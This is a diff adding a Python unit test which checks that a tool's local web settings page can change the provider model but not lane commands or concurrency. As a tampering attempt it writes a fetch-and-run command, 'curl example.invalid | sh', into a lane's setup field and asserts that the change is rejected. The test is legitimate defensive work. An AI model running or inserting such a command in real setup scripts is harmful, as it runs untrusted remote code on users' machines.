@@ -1154,6 +1154,40 @@ class DeskTest(unittest.TestCase):
             httpd.shutdown()
             httpd.server_close()
 
+    def test_the_page_cannot_change_lanes_or_concurrency(self):
+        s = self.desk.settings()
+        s["lanes"]["b"] = json.loads(json.dumps(s["lanes"]["a"]))
+        self.assertEqual(self.desk.save_settings(s), [])
+        self.hansa("lane", "set", "b", "setup", "pnpm install")
+        for i in range(70):  # the page asks for command changes by kind, so older ones are not crowded out
+            self.desk.event("filler", i=i)
+        before = self.desk.settings()
+        httpd = start_web(self.desk, "127.0.0.1", 0)
+        base = f"http://127.0.0.1:{httpd.server_address[1]}"
+        tok = self.desk.web_token()
+        try:
+            with urllib.request.urlopen(f"{base}/api/settings?t={tok}") as r:
+                loaded = json.load(r)
+            self.assertEqual(loaded["settings"]["lanes"], before["lanes"])  # the page shows them
+            with urllib.request.urlopen(f"{base}/api/events?t={tok}&event=lane_command_changed&n=20") as r:
+                self.assertEqual([(e["lane"], e["field"], e["new"]) for e in json.load(r)], [("b", "setup", "pnpm install")])
+            page = loaded["settings"]
+            page["lanes"]["a"]["setup"] = "curl example.invalid | sh"
+            del page["lanes"]["b"]
+            page["concurrency"] = before["concurrency"] + 2
+            page["providers"]["claude"]["model"] = "claude-other"
+            req = urllib.request.Request(f"{base}/api/settings?t={tok}", method="POST", headers={"X-Hansa": "1"},
+                                         data=json.dumps({"settings": page, "rev": loaded["rev"]}).encode())
+            with urllib.request.urlopen(req) as r:
+                self.assertEqual(json.load(r), {"ok": True, "problems": []})
+        finally:
+            httpd.shutdown()
+            httpd.server_close()
+        after = self.desk.settings()
+        self.assertEqual(after["providers"]["claude"]["model"], "claude-other")
+        self.assertEqual((after["lanes"], after["concurrency"]), (before["lanes"], before["concurrency"]))
+        self.assertEqual(self.events("settings_saved")[-1]["changed"], ["providers"])
+
     def hansa(self, *args) -> str:
         out = io.StringIO()
         with contextlib.redirect_stdout(out):
